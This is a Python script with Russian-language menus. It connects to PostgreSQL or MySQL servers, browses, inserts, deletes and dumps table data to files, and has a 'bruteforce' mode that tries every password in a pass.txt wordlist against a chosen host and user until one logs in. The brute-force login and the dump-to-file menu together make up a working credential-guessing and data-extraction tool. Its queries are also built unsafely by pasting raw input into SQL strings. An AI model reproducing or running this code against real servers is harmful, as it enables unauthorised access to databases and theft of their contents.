import subprocess
import sys
import os
import psycopg2
import mysql.connector

def manual_input_psql():
    host = input("Введите доменное имя или IP-адрес: ")
    port = input("Введите порт (оставьте пустым для порта по умолчанию 5432): ")
    if not port:
        port = "5432"
    username = input("Введите имя пользователя: ")
    database = input("Введите имя базы данных: ")
    password = input("Введите пароль: ")
    
    try:
        conn = psycopg2.connect(
            host=host,
            port=port,
            user=username,
            password=password,
            database=database
        )
        print("Успешное подключение к базе данных PostgreSQL")
        psql_menu(conn)
    except Exception as e:
        print(f"Ошибка при подключении к базе данных: {e}")

def manual_input_mysql():
    host = input("Введите доменное имя или IP-адрес: ")
    port = input("Введите порт (оставьте пустым для порта по умолчанию 3306): ")
    if not port:
        port = "3306"
    username = input("Введите имя пользователя: ")
    database = input("Введите имя базы данных: ")
    password = input("Введите пароль: ")
    
    try:
        conn = mysql.connector.connect(
            host=host,
            port=port,
            user=username,
            password=password,
            database=database
        )
        print("Успешное подключение к базе данных MySQL")
        mysql_menu(conn)
    except Exception as e:
        print(f"Ошибка при подключении к базе данных: {e}")

def psql_menu(conn):
    while True:
        print("\nВыберите действие:")
        print("1. Показать таблицы")
        print("2. Выбрать данные из таблицы")
        print("3. Добавить данные в таблицу")
        print("4. Удалить данные из таблицы")
        print("5. Скачать данные в текстовый файл")
        print("6. Выход")
        choice = input("Введите номер действия: ")
        
        if choice == "1":
            show_tables(conn)
        elif choice == "2":
            select_data(conn)
        elif choice == "3":
            insert_data(conn)
        elif choice == "4":
            delete_data(conn)
        elif choice == "5":
            download_data(conn)
        elif choice == "6":
            print("Выход из меню PostgreSQL")
            break
        else:
            print("Неверный выбор. Пожалуйста, выберите действие от 1 до 6.")

def mysql_menu(conn):
    while True:
        print("\nВыберите действие:")
        print("1. Показать таблицы")
        print("2. Выбрать данные из таблицы")
        print("3. Добавить данные в таблицу")
        print("4. Удалить данные из таблицы")
        print("5. Скачать данные в текстовый файл")
        print("6. Выход")
        choice = input("Введите номер действия: ")
        
        if choice == "1":
            show_tables(conn)
        elif choice == "2":
            select_data(conn)
        elif choice == "3":
            insert_data(conn)
        elif choice == "4":
            delete_data(conn)
        elif choice == "5":
            download_data(conn)
        elif choice == "6":
            print("Выход из меню MySQL")
            break
        else:
            print("Неверный выбор. Пожалуйста, выберите действие от 1 до 6.")

def show_tables(conn):
    cursor = conn.cursor()
    if isinstance(conn, psycopg2.extensions.connection):
        cursor.execute("""
            SELECT table_name 
            FROM information_schema.tables 
            WHERE table_schema = 'public'
        """)
    elif isinstance(conn, mysql.connector.connection.MySQLConnection):
        cursor.execute("""
            SELECT table_name 
            FROM information_schema.tables 
            WHERE table_schema = DATABASE()
        """)
    tables = cursor.fetchall()
    print("\nТаблицы в базе данных:")
    for table in tables:
        print(table[0])
    cursor.close()

def select_data(conn):
    table_name = input("Введите имя таблицы: ")
    limit = input("Введите лимит строк (оставьте пустым для вывода всех строк): ")
    if not limit:
        limit = "ALL"
    else:
        limit = int(limit)
    
    cursor = conn.cursor()
    cursor.execute(f"SELECT * FROM {table_name} LIMIT {limit}")
    rows = cursor.fetchall()
    colnames = [desc[0] for desc in cursor.description]
    
    print(f"\nДанные из таблицы {table_name}:")
    print(colnames)
    for row in rows:
        print(row)
    cursor.close()

def insert_data(conn):
    table_name = input("Введите имя таблицы: ")
    columns = input("Введите имена столбцов через запятую: ")
    values = input("Введите значения через запятую: ")
    
    cursor = conn.cursor()
    cursor.execute(f"INSERT INTO {table_name} ({columns}) VALUES ({values})")
    conn.commit()
    print("Данные успешно добавлены")
    cursor.close()

def delete_data(conn):
    table_name = input("Введите имя таблицы: ")
    condition = input("Введите условие для удаления (например, id=1): ")
    
    cursor = conn.cursor()
    cursor.execute(f"DELETE FROM {table_name} WHERE {condition}")
    conn.commit()
    print("Данные успешно удалены")
    cursor.close()

def download_data(conn):
    table_name = input("Введите имя таблицы: ")
    file_format = input("Введите формат файла (txt или csv): ")
    file_name = f"{table_name}.{file_format}"
    
    cursor = conn.cursor()
    cursor.execute(f"SELECT * FROM {table_name}")
    rows = cursor.fetchall()
    colnames = [desc[0] for desc in cursor.description]
    
    with open(file_name, 'w') as f:
        if file_format == "csv":
            f.write(",".join(colnames) + "\n")
            for row in rows:
                f.write(",".join(map(str, row)) + "\n")
        else:
            f.write("\t".join(colnames) + "\n")
            for row in rows:
                f.write("\t".join(map(str, row)) + "\n")
    
    print(f"Данные успешно сохранены в файл {file_name}")
    cursor.close()

def bruteforce_psql():
    host = input("Введите доменное имя или IP-адрес: ")
    port = input("Введите порт (оставьте пустым для порта по умолчанию 5432): ")
    if not port:
        port = "5432"
    username = input("Введите имя пользователя: ")
    database = input("Введите имя базы данных: ")
    
    with open("pass.txt", "r") as file:
        passwords = file.readlines()
    
    for password in passwords:
        password = password.strip()
        print(f"Пробуем пароль: {password}")
        
        try:
            conn = psycopg2.connect(
                host=host,
                port=port,
                user=username,
                password=password,
                database=database
            )
            print(f"Успешный вход! Пароль: {password}")
            psql_menu(conn)
            return  # Останавливаем брутфорс, если пароль верный
        except Exception as e:
            print(f"Неверный пароль или другая ошибка: {e}")

def bruteforce_mysql():
    host = input("Введите доменное имя или IP-адрес: ")
    port = input("Введите порт (оставьте пустым для порта по умолчанию 3306): ")
    if not port:
        port = "3306"
    username = input("Введите имя пользователя: ")
    database = input("Введите имя базы данных: ")
    
    with open("pass.txt", "r") as file:
        passwords = file.readlines()
    
    for password in passwords:
        password = password.strip()
        print(f"Пробуем пароль: {password}")
        
        try:
            conn = mysql.connector.connect(
                host=host,
                port=port,
                user=username,
                password=password,
                database=database
            )
            print(f"Успешный вход! Пароль: {password}")
            mysql_menu(conn)
            return  # Останавливаем брутфорс, если пароль верный
        except Exception as e:
            print(f"Неверный пароль или другая ошибка: {e}")

def main_menu():
    print("1. Подключение к PostgreSQL (psql)")
    print("2. Подключение к MySQL")
    choice = input("Выберите опцию (1 или 2): ")
    
    if choice == "1":
        print("1. Ручной ввод данных")
        print("2. Брутфорс пароля")
        sub_choice = input("Выберите опцию (1 или 2): ")
        if sub_choice == "1":
            manual_input_psql()
        elif sub_choice == "2":
            bruteforce_psql()
        else:
            print("Неверный выбор. Пожалуйста, выберите 1 или 2.")
            main_menu()
    elif choice == "2":
        print("1. Ручной ввод данных")
        print("2. Брутфорс пароля")
        sub_choice = input("Выберите опцию (1 или 2): ")
        if sub_choice == "1":
            manual_input_mysql()
        elif sub_choice == "2":
            bruteforce_mysql()
        else:
            print("Неверный выбор. Пожалуйста, выберите 1 или 2.")
            main_menu()
    else:
        print("Неверный выбор. Пожалуйста, выберите 1 или 2.")
        main_menu()

if __name__ == "__main__":
    try:
        import psycopg2
        import mysql.connector
    except ImportError:
        print("Ошибка: модули psycopg2 или mysql-connector-python не установлены. Пожалуйста, установите их с помощью 'pip install psycopg2 mysql-connector-python'.")
        sys.exit(1)
    
    main_menu()
